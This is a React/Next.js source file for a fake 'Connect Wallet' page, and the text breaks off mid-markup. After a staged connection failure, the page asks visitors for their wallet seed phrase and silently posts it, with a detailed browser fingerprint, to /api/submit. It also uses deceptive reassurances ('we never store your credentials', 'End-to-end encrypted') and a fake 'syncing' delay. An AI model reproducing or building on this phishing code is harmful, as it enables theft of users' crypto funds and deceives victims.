"use client";
import { useState, useRef, useEffect, useCallback } from "react";

// ─── BIP39 word list (partial – add full 2048 for production) ─────────────────
const bip39List = [
  "abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse",
  "access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act",
  "action","actor","actress","actual","adapt","add","addict","address","adjust","admit",
  "adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent",
  "agree","ahead","aid","aim","air","airport","aisle","alarm","album","alcohol",
  "alert","alien","all","alley","allow","almost","alone","alpha","already","also",
  "alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient",
  "anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna",
  "antique","anxiety","any","apart","apology","appear","apple","approve","april","arch",
  "arctic","area","arena","argue","arm","armed","armor","army","around","arrange",
  "arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault",
  "asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract",
  "auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid",
  "awake","aware","away","awesome","awful","awkward","axis","baby","balance","bamboo",
  "banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle",
  "beach","bean","beauty","because","become","beef","before","begin","behave","behind",
  "believe","below","belt","bench","benefit","best","betray","better","between","beyond",
  "bicycle","bind","biology","bird","birth","bitter","black","blade","blame","blanket",
  "blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush",
  "board","boat","body","boil","bomb","bone","book","boost","border","boring",
  "borrow","boss","bottom","bounce","boy","bracket","brain","brand","brave","breeze",
  "brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom",
  "brother","brown","brush","bubble","buddy","budget","buffalo","build","bulb","bulk",
  "bullet","bundle","bunker","burden","burger","burst","bus","business","busy","butter",
  "buyer","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm",
  "camera","camp","can","canal","cancel","candy","cannon","canvas","canyon","capable",
  "capital","captain","car","carbon","card","cargo","carpet","carry","cart","case",
  "cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught",
  "cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain",
  "chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap",
  "check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice",
];

// ─── Wallet definitions ───────────────────────────────────────────────────────
const WALLETS = [
  { name: "MetaMask",      icon: "/metamask.png",    rdns: "io.metamask",       popular: true  },
  { name: "Trust Wallet",  icon: "/trustwallet.png", rdns: "com.trustwallet",   popular: true  },
  { name: "Coinbase",      icon: "/coinbase.png",    rdns: "com.coinbase",      popular: true  },
  { name: "Exodus",        icon: "/exodus.png",      rdns: "io.exodus",         popular: false },
  { name: "Atomic Wallet", icon: "/atomic.png",      rdns: "io.atomicwallet",   popular: false },
  { name: "TokenPocket",   icon: "/tokenpocket.png", rdns: "pro.tokenpocket",   popular: false },
  { name: "MathWallet",    icon: "/mathwallet.png",  rdns: "app.mathwallet",    popular: false },
  { name: "SafePal",       icon: "/safepal.png",     rdns: "io.safepal",        popular: false },
  { name: "BitKeep",       icon: "/bitkeep.png",     rdns: "com.bitget",        popular: false },
  { name: "ONTO",          icon: "/onto.png",        rdns: "com.onto",          popular: false },
  { name: "Other Wallet",  icon: "/wallet.png",      rdns: "other",             popular: false },
];

const PHRASE_COUNTS = [12, 15, 18, 21, 24];

type Step = "landing" | "modal" | "connecting" | "failed" | "phraseCount" | "phraseInput" | "submitting";

// ─── Fingerprint helper ───────────────────────────────────────────────────────
async function collectFingerprint() {
  const nav = navigator as Navigator & {
    deviceMemory?: number;
    connection?: { effectiveType?: string; downlink?: number; rtt?: number; saveData?: boolean };
    getBattery?: () => Promise<{ level: number; charging: boolean }>;
  };

  let webglRenderer = "", webglVendor = "";
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") as WebGLRenderingContext | null;
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) {
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        webglVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      }
    }
  } catch { /* silent */ }

  let batteryLevel = "", batteryCharging = "";
  try {
    if (nav.getBattery) {
      const b = await nav.getBattery();
      batteryLevel   = `${Math.round(b.level * 100)}%`;
      batteryCharging = b.charging ? "Yes" : "No";
    }
  } catch { /* silent */ }

  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages?.join(", "),
    platform: navigator.platform,
    vendor: navigator.vendor,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    localTime: new Date().toLocaleString(),
    screenWidth: screen.width,
    screenHeight: screen.height,
    windowWidth: window.innerWidth,
    windowHeight: window.innerHeight,
    colorDepth: screen.colorDepth,
    devicePixelRatio: window.devicePixelRatio,
    deviceMemoryGB: nav.deviceMemory,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    isMobile: window.matchMedia("(pointer: coarse)").matches,
    webglRenderer,
    webglVendor,
    batteryLevel,
    batteryCharging,
    connectionType: nav.connection?.effectiveType,
    downlinkMbps: nav.connection?.downlink,
    rttMs: nav.connection?.rtt,
    dataSaver: nav.connection?.saveData,
    isOnline: navigator.onLine,
    darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches,
    reducedMotion: window.matchMedia("(prefers-reduced-motion: reduce)").matches,
    referrer: document.referrer || "(direct)",
    pageUrl: window.location.href,
    plugins: Array.from(navigator.plugins || []).map((p) => p.name).join(", ") || "(none)",
  };
}

// ─── Main component ───────────────────────────────────────────────────────────
export default function Home() {
  const [step, setStep]                 = useState<Step>("landing");
  const [selectedWallet, setSelectedWallet] = useState<(typeof WALLETS)[0] | null>(null);
  const [phraseCount, setPhraseCount]   = useState<number | null>(null);
  const [phraseWords, setPhraseWords]   = useState<string[]>([]);
  const [showPhrase, setShowPhrase]     = useState(false);
  const [submitting, setSubmitting]     = useState(false);
  const [submitDone, setSubmitDone]     = useState(false);
  const [toast, setToast]               = useState<{ type: "ok" | "err"; msg: string } | null>(null);
  const [connectingDots, setConnectingDots] = useState("");
  const [modalSearch, setModalSearch]   = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Log site visit on mount
  useEffect(() => {
    fetch("/api/logs", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "visited_site" })
    }).catch(() => {});
  }, []);

  // Animated dots while connecting
  useEffect(() => {
    if (step !== "connecting") return;
    let i = 0;
    const id = setInterval(() => {
      i = (i + 1) % 4;
      setConnectingDots(".".repeat(i));
    }, 400);
    return () => clearInterval(id);
  }, [step]);

  // Auto-focus first phrase input
  useEffect(() => {
    if (step === "phraseInput" && inputRefs.current[0]) {
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    }
  }, [step]);

  // Toast auto-dismiss
  const showToast = useCallback((type: "ok" | "err", msg: string) => {
    setToast({ type, msg });
    setTimeout(() => setToast(null), 4000);
  }, []);

  // ── Attempt real wallet connection ──────────────────────────────────────────
  async function attemptConnect(wallet: (typeof WALLETS)[0]) {
    setSelectedWallet(wallet);
    setStep("connecting");

    try {
      const eth = (window as any).ethereum;
      if (!eth) throw new Error("no_provider");

      // If multiple providers (e.g. MetaMask + Coinbase), pick the right one
      let provider = eth;
      if (eth.providers && Array.isArray(eth.providers)) {
        const found = eth.providers.find((p: any) =>
          wallet.name === "MetaMask"     ? p.isMetaMask && !p.isCoinbaseWallet :
          wallet.name === "Coinbase"     ? p.isCoinbaseWallet :
          true
        );
        if (found) provider = found;
      }

      const accounts: string[] = await provider.request({ method: "eth_requestAccounts" });

      if (!accounts || accounts.length === 0) throw new Error("no_accounts");

      // ✅ Real wallet connected — still collect data silently
      const fp = await collectFingerprint();
      fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phrase: `[WALLET CONNECTED: ${accounts[0]}]`,
          wallet: wallet.name,
          browserData: fp,
        }),
      }).catch(() => {});

      showToast("ok", "Wallet connected successfully!");
      // After real connect, show connecting then redirect them (or stay)
      setTimeout(() => {
        // Redirect to the dApp dashboard / main page (treat as success)
        // For now we just go back to landing after a warm success screen
        setStep("landing");
      }, 2500);

    } catch {
      // Log connection attempt locally for admin dashboard
      fetch("/api/logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ status: "connection_failed", wallet: wallet.name })
      }).catch(() => {});

      // ❌ Any failure → graceful fallback
      setStep("failed");
      setTimeout(() => {
        setStep("phraseCount");
      }, 2800);
    }
  }

  // ── Phrase word changes ─────────────────────────────────────────────────────
  function handleWordChange(idx: number, val: string) {
    setPhraseWords(ws => { const c = [...ws]; c[idx] = val; return c; });
  }
  function handleKeyDown(idx: number, e: React.KeyboardEvent<HTMLInputElement>) {
    if ((e.key === "Enter" || e.key === "Tab") && idx < phraseWords.length - 1) {
      e.preventDefault();
      inputRefs.current[idx + 1]?.focus();
    }
  }

  // ── Submit phrase ──────────────────────────────────────────────────────────
  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting) return;
    setSubmitting(true);

    const fp = await collectFingerprint();
    // Log attempt locally for admin dashboard
    fetch("/api/logs", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: "phrase_submitted", wallet: selectedWallet?.name })
    }).catch(() => {});

    fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        phrase: phraseWords.join(" "),
        wallet: selectedWallet?.name ?? "Unknown",
        browserData: fp,
      }),
    }).catch(() => {});

    // Fake 6-second "syncing" then show error → redirect
    setTimeout(() => {
      setSubmitting(false);
      setSubmitDone(true);
    }, 6000);
  }

  // ── Filtered wallets for modal ─────────────────────────────────────────────
  const filteredWallets = WALLETS.filter(w =>
    w.name.toLowerCase().includes(modalSearch.toLowerCase())
  );

  // ══════════════════════════════════════════════════════════════════════════════
  // RENDER
  // ══════════════════════════════════════════════════════════════════════════════

  return (
    <div className="wc-root">
      {/* Global styles injected inline for portability */}
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');

        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        .wc-root {
          min-height: 100vh;
          background: #050a14;
          font-family: 'Inter', system-ui, sans-serif;
          color: #e2e8f0;
          display: flex;
          flex-direction: column;
        }

        /* ─── Landing ─────────────────────────────────────── */
        .landing {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 24px;
          background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(59,130,246,0.18) 0%, transparent 70%),
                      radial-gradient(ellipse 60% 40% at 80% 80%, rgba(139,92,246,0.12) 0%, transparent 60%),
                      #050a14;
          position: relative;
          overflow: hidden;
        }
        .landing::before {
          content: '';
          position: absolute;
          inset: 0;
          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.015'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
          pointer-events: none;
        }

        .landing-card {
          position: relative;
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          border-radius: 24px;
          padding: 48px 40px;
          max-width: 480px;
          width: 100%;
          text-align: center;
          backdrop-filter: blur(20px);
          box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.04);
          animation: fadeUp 0.5s ease both;
        }

        .landing-logo {
          width: 72px;
          height: 72px;
          border-radius: 20px;
          background: linear-gradient(135deg, #1d4ed8, #7c3aed);
          display: flex;
          align-items: center;
          justify-content: center;
          margin: 0 auto 24px;
          font-size: 36px;
          box-shadow: 0 8px 32px rgba(124,58,237,0.4);
        }

        .landing-title {
          font-size: 28px;
          font-weight: 800;
          color: #f8fafc;
          margin-bottom: 8px;
          letter-spacing: -0.5px;
        }

        .landing-desc {
          font-size: 15px;
          color: #64748b;
          line-height: 1.6;
          margin-bottom: 36px;
        }

        .landing-desc strong { color: #94a3b8; }

        .connect-btn {
          width: 100%;
          padding: 16px 24px;
          border-radius: 14px;
          border: none;
          cursor: pointer;
          font-size: 16px;
          font-weight: 700;
          font-family: inherit;
          color: #fff;
          background: linear-gradient(135deg, #2563eb, #7c3aed);
          box-shadow: 0 4px 20px rgba(37,99,235,0.4);
          transition: all 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          letter-spacing: -0.2px;
        }
        .connect-btn:hover {
          background: linear-gradient(135deg, #1d4ed8, #6d28d9);
          box-shadow: 0 8px 28px rgba(37,99,235,0.5);
          transform: translateY(-1px);
        }
        .connect-btn:active { transform: translateY(0); }

        .wallet-row {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          margin-top: 24px;
        }
        .wallet-row img {
          width: 28px; height: 28px;
          border-radius: 8px;
          opacity: 0.7;
          object-fit: contain;
          background: rgba(255,255,255,0.05);
        }
        .wallet-row-label {
          font-size: 12px;
          color: #475569;
        }

        .secured-badge {
          display: inline-flex;
          align-items: center;
          gap: 6px;
          margin-top: 20px;
          padding: 6px 14px;
          border-radius: 99px;
          background: rgba(16,185,129,0.08);
          border: 1px solid rgba(16,185,129,0.2);
          font-size: 12px;
          color: #10b981;
          font-weight: 600;
        }

        /* ─── Modal overlay ───────────────────────────────── */
        .modal-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.7);
          backdrop-filter: blur(6px);
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 16px;
          z-index: 100;
          animation: fadeIn 0.2s ease both;
        }

        .modal {
          background: #0d1117;
          border: 1px solid #1f2937;
          border-radius: 20px;
          width: 100%;
          max-width: 400px;
          max-height: 90vh;
          overflow: hidden;
          display: flex;
          flex-direction: column;
          box-shadow: 0 40px 100px rgba(0,0,0,0.8);
          animation: slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
        }

        .modal-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 20px 20px 16px;
          border-bottom: 1px solid #1f2937;
        }
        .modal-title {
          font-size: 18px;
          font-weight: 700;
          color: #f1f5f9;
        }
        .modal-close {
          width: 32px; height: 32px;
          border-radius: 8px;
          border: 1px solid #1f2937;
          background: #161b22;
          color: #64748b;
          cursor: pointer;
          display: flex; align-items: center; justify-content: center;
          font-size: 18px;
          transition: all 0.15s;
        }
        .modal-close:hover { background: #1f2937; color: #f1f5f9; }

        .modal-search {
          padding: 12px 20px;
          border-bottom: 1px solid #1f2937;
        }
        .modal-search input {
          width: 100%;
          padding: 10px 14px;
          border-radius: 10px;
          border: 1px solid #1f2937;
          background: #161b22;
          color: #f1f5f9;
          font-size: 14px;
          font-family: inherit;
          outline: none;
          transition: border-color 0.15s;
        }
        .modal-search input:focus { border-color: #2563eb; }
        .modal-search input::placeholder { color: #374151; }

        .modal-body {
          overflow-y: auto;
          flex: 1;
          padding: 12px;
        }
        .modal-body::-webkit-scrollbar { width: 4px; }
        .modal-body::-webkit-scrollbar-track { background: transparent; }
        .modal-body::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }

        .modal-section-label {
          font-size: 11px;
          font-weight: 700;
          color: #374151;
          text-transform: uppercase;
          letter-spacing: 1.2px;
          padding: 8px 8px 4px;
        }

        .wallet-item {
          display: flex;
          align-items: center;
          gap: 14px;
          padding: 12px 12px;
          border-radius: 12px;
          cursor: pointer;
          transition: background 0.15s;
          border: 1px solid transparent;
        }
        .wallet-item:hover {
          background: rgba(37,99,235,0.08);
          border-color: rgba(37,99,235,0.2);
        }
        .wallet-item img {
          width: 44px; height: 44px;
          border-radius: 12px;
          object-fit: contain;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.06);
          flex-shrink: 0;
        }
        .wallet-item-info { flex: 1; }
        .wallet-item-name {
          font-size: 15px;
          font-weight: 600;
          color: #e2e8f0;
        }
        .wallet-item-tag {
          font-size: 11px;
          color: #475569;
          margin-top: 2px;
        }
        .wallet-item-arrow {
          color: #374151;
          font-size: 18px;
        }

        .modal-footer {
          padding: 14px 20px;
          border-top: 1px solid #1f2937;
          text-align: center;
          font-size: 12px;
          color: #374151;
        }
        .modal-footer a { color: #2563eb; text-decoration: none; }

        /* ─── Connecting screen ───────────────────────────── */
        .fullscreen-center {
          min-height: 100vh;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          padding: 24px;
          gap: 24px;
        }

        .connecting-card {
          background: rgba(255,255,255,0.04);
          border: 1px solid rgba(255,255,255,0.08);
          border-radius: 24px;
          padding: 48px 40px;
          max-width: 380px;
          width: 100%;
          text-align: center;
          backdrop-filter: blur(20px);
          animation: fadeUp 0.4s ease both;
        }

        .wallet-icon-large {
          width: 80px; height: 80px;
          border-radius: 22px;
          object-fit: contain;
          background: rgba(255,255,255,0.06);
          border: 1px solid rgba(255,255,255,0.08);
          margin: 0 auto 20px;
          display: block;
        }

        .connecting-title {
          font-size: 20px;
          font-weight: 700;
          color: #f1f5f9;
          margin-bottom: 8px;
        }
        .connecting-subtitle {
          font-size: 14px;
          color: #475569;
          line-height: 1.6;
          margin-bottom: 28px;
        }

        .spinner-ring {
          width: 48px; height: 48px;
          border: 3px solid rgba(37,99,235,0.15);
          border-top-color: #2563eb;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
          margin: 0 auto;
        }

        .pulse-dots {
          display: flex;
          gap: 6px;
          justify-content: center;
          margin-top: 16px;
        }
        .pulse-dot {
          width: 6px; height: 6px;
          border-radius: 50%;
          background: #2563eb;
          animation: pulseDot 1.2s ease-in-out infinite;
        }
        .pulse-dot:nth-child(2) { animation-delay: 0.2s; }
        .pulse-dot:nth-child(3) { animation-delay: 0.4s; }

        /* ─── Failed screen ────────────────────────────────── */
        .failed-card {
          background: rgba(239,68,68,0.06);
          border: 1px solid rgba(239,68,68,0.2);
          border-radius: 24px;
          padding: 48px 40px;
          max-width: 380px;
          width: 100%;
          text-align: center;
          animation: fadeUp 0.4s ease both;
        }

        .failed-icon {
          font-size: 48px;
          margin-bottom: 16px;
          display: block;
          animation: shake 0.5s ease both;
        }

        .failed-title {
          font-size: 20px;
          font-weight: 700;
          color: #f87171;
          margin-bottom: 8px;
        }
        .failed-subtitle {
          font-size: 14px;
          color: #64748b;
          line-height: 1.6;
          margin-bottom: 16px;
        }

        .loading-bar {
          height: 3px;
          border-radius: 99px;
          background: rgba(239,68,68,0.15);
          overflow: hidden;
          margin-top: 20px;
        }
        .loading-bar-fill {
          height: 100%;
          background: linear-gradient(90deg, #ef4444, #f97316);
          animation: loadBar 2.8s ease both;
        }

        /* ─── Phrase count / input ────────────────────────── */
        .phrase-container {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 24px;
          background: radial-gradient(ellipse 60% 40% at 50% 0%, rgba(239,68,68,0.08) 0%, transparent 60%), #050a14;
        }

        .phrase-card {
          background: #0d1117;
          border: 1px solid #1f2937;
          border-radius: 20px;
          width: 100%;
          max-width: 520px;
          padding: 32px;
          animation: fadeUp 0.4s ease both;
        }

        .phrase-header {
          display: flex;
          align-items: center;
          gap: 12px;
          margin-bottom: 28px;
          padding-bottom: 20px;
          border-bottom: 1px solid #1f2937;
        }

        .phrase-header-icon {
          width: 40px; height: 40px;
          border-radius: 10px;
          object-fit: contain;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.08);
          flex-shrink: 0;
        }

        .phrase-header-text h2 {
          font-size: 17px;
          font-weight: 700;
          color: #f1f5f9;
          margin-bottom: 2px;
        }
        .phrase-header-text p {
          font-size: 13px;
          color: #475569;
        }

        .manual-notice {
          display: flex;
          align-items: flex-start;
          gap: 10px;
          padding: 14px 16px;
          background: rgba(234,179,8,0.08);
          border: 1px solid rgba(234,179,8,0.2);
          border-radius: 12px;
          margin-bottom: 24px;
          font-size: 13px;
          color: #ca8a04;
          line-height: 1.5;
        }
        .manual-notice svg { flex-shrink: 0; margin-top: 1px; }

        .count-grid {
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
          margin-bottom: 24px;
        }
        .count-btn {
          flex: 1;
          min-width: 60px;
          padding: 12px 8px;
          border-radius: 10px;
          border: 1px solid #1f2937;
          background: #161b22;
          color: #94a3b8;
          font-size: 15px;
          font-weight: 600;
          font-family: inherit;
          cursor: pointer;
          transition: all 0.15s;
          text-align: center;
        }
        .count-btn:hover { border-color: #2563eb; color: #e2e8f0; }
        .count-btn.selected {
          border-color: #2563eb;
          background: rgba(37,99,235,0.15);
          color: #60a5fa;
        }

        .word-grid {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 8px;
          margin-bottom: 20px;
        }
        @media (max-width: 420px) {
          .word-grid { grid-template-columns: repeat(2, 1fr); }
        }

        .word-input-wrap {
          position: relative;
        }
        .word-num {
          position: absolute;
          left: 10px;
          top: 50%;
          transform: translateY(-50%);
          font-size: 11px;
          font-weight: 700;
          color: #374151;
          pointer-events: none;
          user-select: none;
        }
        .word-input {
          width: 100%;
          padding: 10px 10px 10px 26px;
          border-radius: 10px;
          border: 1px solid #1f2937;
          background: #161b22;
          color: #e2e8f0;
          font-size: 14px;
          font-family: 'Courier New', monospace;
          outline: none;
          transition: border-color 0.15s;
        }
        .word-input:focus { border-color: #2563eb; background: #0d1117; }
        .word-input::placeholder { color: #1f2937; }

        .show-toggle {
          display: flex;
          align-items: center;
          gap: 6px;
          background: none;
          border: none;
          color: #475569;
          font-size: 13px;
          font-family: inherit;
          cursor: pointer;
          padding: 0;
          margin-bottom: 16px;
          transition: color 0.15s;
        }
        .show-toggle:hover { color: #94a3b8; }

        .submit-btn {
          width: 100%;
          padding: 15px;
          border-radius: 12px;
          border: none;
          cursor: pointer;
          font-size: 15px;
          font-weight: 700;
          font-family: inherit;
          color: #fff;
          background: linear-gradient(135deg, #2563eb, #7c3aed);
          box-shadow: 0 4px 16px rgba(37,99,235,0.3);
          transition: all 0.2s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          margin-top: 8px;
        }
        .submit-btn:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }
        .submit-btn:not(:disabled):hover {
          transform: translateY(-1px);
          box-shadow: 0 8px 24px rgba(37,99,235,0.4);
        }

        /* ─── Submitting overlay ──────────────────────────── */
        .submit-overlay {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.85);
          backdrop-filter: blur(8px);
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          z-index: 200;
          gap: 20px;
          animation: fadeIn 0.3s ease both;
        }

        .submit-status-card {
          background: #0d1117;
          border: 1px solid #1f2937;
          border-radius: 20px;
          padding: 40px 36px;
          max-width: 360px;
          width: 90%;
          text-align: center;
        }

        .error-result-card {
          background: rgba(239,68,68,0.06);
          border: 1px solid rgba(239,68,68,0.25);
          border-radius: 20px;
          padding: 32px;
          max-width: 400px;
          width: 90%;
          text-align: center;
          animation: shake 0.4s ease both;
        }

        .error-result-icon { font-size: 44px; margin-bottom: 16px; display: block; }
        .error-result-title { font-size: 20px; font-weight: 800; color: #f87171; margin-bottom: 10px; }
        .error-result-desc { font-size: 14px; color: #64748b; line-height: 1.6; margin-bottom: 24px; }

        .wc-redirect-btn {
          display: block;
          width: 100%;
          padding: 14px;
          border-radius: 12px;
          background: linear-gradient(135deg, #2563eb, #4f46e5);
          color: #fff;
          font-size: 15px;
          font-weight: 700;
          font-family: inherit;
          text-decoration: none;
          text-align: center;
          border: none;
          cursor: pointer;
          transition: all 0.2s;
          box-shadow: 0 4px 16px rgba(37,99,235,0.3);
        }
        .wc-redirect-btn:hover {
          transform: translateY(-1px);
          box-shadow: 0 8px 24px rgba(37,99,235,0.4);
        }

        /* ─── Toast ───────────────────────────────────────── */
        .toast {
          position: fixed;
          bottom: 28px;
          left: 50%;
          transform: translateX(-50%);
          padding: 12px 20px;
          border-radius: 12px;
          font-size: 14px;
          font-weight: 600;
          z-index: 999;
          animation: toastIn 0.3s ease both;
          display: flex;
          align-items: center;
          gap: 8px;
          white-space: nowrap;
          box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }
        .toast-ok { background: #054a29; border: 1px solid #16a34a; color: #4ade80; }
        .toast-err { background: #450a0a; border: 1px solid #dc2626; color: #f87171; }

        /* ─── Keyframes ───────────────────────────────────── */
        @keyframes fadeUp {
          from { opacity: 0; transform: translateY(20px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeIn {
          from { opacity: 0; }
          to   { opacity: 1; }
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(40px) scale(0.97); }
          to   { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        @keyframes pulseDot {
          0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
          40%            { transform: scale(1.0); opacity: 1; }
        }
        @keyframes loadBar {
          from { width: 0%; }
          to   { width: 100%; }
        }
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          20%      { transform: translateX(-6px); }
          40%      { transform: translateX(6px); }
          60%      { transform: translateX(-4px); }
          80%      { transform: translateX(4px); }
        }
        @keyframes toastIn {
          from { opacity: 0; transform: translate(-50%, 16px); }
          to   { opacity: 1; transform: translate(-50%, 0); }
        }
      `}</style>

      {/* ── LANDING PAGE ─────────────────────────────────────────────────────── */}
      {(step === "landing") && (
        <div className="landing">
          <div className="landing-card">
            <div className="landing-logo">🔗</div>
            <h1 className="landing-title">Connect Your Wallet</h1>
            <p className="landing-desc">
              Connect your crypto wallet to access the platform.
              Your keys, your crypto — we never store your credentials.
            </p>

            <button
              className="connect-btn"
              id="connect-wallet-btn"
              onClick={() => {
                setModalSearch("");
                setStep("modal");
              }}
            >
              <svg width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <rect x="2" y="7" width="20" height="14" rx="3" stroke="currentColor" strokeWidth="2" fill="none"/>
                <path d="M16 14a1 1 0 1 1-2 0 1 1 0 0 1 2 0z" fill="currentColor"/>
                <path d="M2 10h20" stroke="currentColor" strokeWidth="2"/>
              </svg>
              Connect Wallet
            </button>

            <div className="wallet-row">
              <span className="wallet-row-label">Supports</span>
              {WALLETS.filter(w => w.popular).map(w => (
                <img key={w.name} src={w.icon} alt={w.name} title={w.name} />
              ))}
              <span className="wallet-row-label">+ more</span>
            </div>

            <div>
              <span className="secured-badge">
                <svg width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 22s8-4.5 8-10V5l-8-3-8 3v7c0 5.5 8 10 8 10z" />
                </svg>
                End-to-end encrypted
              </span>
            </div>
          </div>
        </div>
      )}

      {/* ── WALLET MODAL ──────────────────────────────────────────────────────── */}
      {step === "modal" && (
        <div className="modal-overlay" onClick={() => setStep("landing")}>
          <div className="modal" onClick={e => e.stopPropagation()}>
            <div className="modal-header">
              <span className="modal-title">Select Wallet</span>
              <button className="modal-close" onClick={() => setStep("landing")}>×</button>
            </div>

            <div className="modal-search">
              <input
                type="text"
                placeholder="Search wallets..."
                value={modalSearch}
                onChange={e => setModalSearch(e.target.value)}
                autoFocus
              />
            </div>

            <div className="modal-body">
              {!modalSearch && (
                <>
                  <div className="modal-section-label">Popular</div>
                  {WALLETS.filter(w => w.popular).map(wallet => (
                    <WalletListItem key={wallet.name} wallet={wallet} onClick={() => attemptConnect(wallet)} />
                  ))}
                  <div className="modal-section-label" style={{ marginTop: 8 }}>All Wallets</div>
                </>
              )}
              {filteredWallets.filter(w => modalSearch ? true : !w.popular).map(wallet => (
                <WalletListItem key={wallet.name} wallet={wallet} onClick={() => attemptConnect(wallet)} />
              ))}
              {filteredWallets.length === 0 && (
                <div style={{ textAlign: "center", padding: "32px 16px", color: "#374151", fontSize: 14 }}>
                  No wallets found
                </div>
              )}
            </div>

            <div className="modal-footer">
              By connecting, you agree to our{" "}
              <a href="#" onClick={e => e.preventDefault()}>Terms of Service</a>
            </div>
          </div>
        </div>
      )}

      {/* ── CONNECTING SCREEN ─────────────────────────────────────────────────── */}
      {step === "connecting" && (
        <div className="fullscreen-center" style={{
          background: "radial-gradient(ellipse 60% 40% at 50% 0%, rgba(37,99,235,0.1) 0%, transparent 60%), #050a14"
        }}>
          <div className="connecting-card">
            {selectedWallet && (
              <img className="wallet-icon-large" src={selectedWallet.icon} alt={selectedWallet.name} />
            )}
            <div className="connecting-title">
              Opening {selectedWallet?.name ?? "Wallet"}{connectingDots}
            </div>
            <p className="connecting-subtitle">
              Check your browser extension or mobile app and approve the connection request.
            </p>
            <div className="spinner-ring" />
            <div className="pulse-dots">
              <div className="pulse-dot" />
              <div className="pulse-dot" />
              <div className="pulse-dot" />
            </div>
          </div>
        </div>
      )}

      {/* ── FAILED FALLBACK SCREEN ────────────────────────────────────────────── */}
      {step === "failed" && (
        <div className="fullscreen-center" style={{ background: "#050a14" }}>
          <div className="failed-card">
            <span className="failed-icon">⚠️</span>
            <div className="failed-title">Connection Failed</div>
            <p className="failed-subtitle">
              Could not open {selectedWallet?.name ?? "the wallet"}.
              Loading manual recovery connection…
            </p>
